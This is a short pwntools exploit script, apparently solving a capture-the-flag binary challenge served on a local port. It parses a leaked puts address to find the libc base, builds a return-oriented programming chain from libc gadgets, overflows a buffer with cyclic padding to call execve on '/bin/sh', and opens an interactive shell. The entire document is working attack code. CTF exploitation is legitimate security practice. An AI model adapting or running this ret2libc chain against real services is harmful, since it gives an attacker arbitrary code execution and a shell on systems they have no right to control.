from pwn import *

context.arch = 'amd64'

local = False

if local:
    r = process("./chall.patched")
    e = ELF("./chall.patched")
    libc = e.libc
else:
    r = remote("127.0.0.1", 24037)
    libc = ELF("libc")

r.recvuntil(b'...\n')
r.recvuntil(b'...\n')
r.recvuntil(b'...\n')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['puts']
log.info("libc_base: %#x" % libc_base)

prdi = libc_base + next(libc.search(asm('pop rdi; ret'), executable=True))
prsi = libc_base + next(libc.search(asm('pop rsi; ret'), executable=True))
#prdxp = libc_base + next(libc.search(asm('pop rdx; pop r12; ret'), executable=True))
prdx = libc_base + 0x000ab891#: pop rdx; or [rcx-0xa], al; ret;
prcx = libc_base + next(libc.search(asm('pop rcx; ret'), executable=True))
execve = libc_base + libc.symbols['execve']
bss = libc_base + libc.bss()
sh = libc_base + next(libc.search(b'/bin/sh\x00'))

#gdb.attach(r)
#input(">>")
rop = []
rop += [prdi, sh]
rop += [prsi, 0]
rop += [prcx, bss]
rop += [prdx, 0]
#rop += [prdxp, 0, 0]
rop += [execve]
r.send(cyclic(0x18) + flat(rop))

r.interactive()
